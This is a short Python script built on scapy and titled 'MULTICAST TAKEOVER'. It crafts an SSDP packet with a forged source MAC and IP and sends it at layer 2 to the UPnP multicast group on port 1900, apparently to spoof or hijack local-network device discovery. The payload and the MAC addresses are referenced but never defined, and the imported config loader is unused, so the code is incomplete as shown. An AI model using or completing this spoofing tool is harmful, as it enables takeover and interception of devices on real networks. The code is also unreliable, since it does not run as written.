#!/usr/bin/env python3
from decouple import config
from scapy.all import *

print('### [ MULTICAST TAKEOVER ] ###')
ssdpRequest = Ether(src=HW_SRC, dst=HW_DST) / IP(src="192.168.1.143",dst="239.255.255.250") / UDP(sport=1025, dport= 1900) / PAYLOAD
sendp(ssdpRequest)
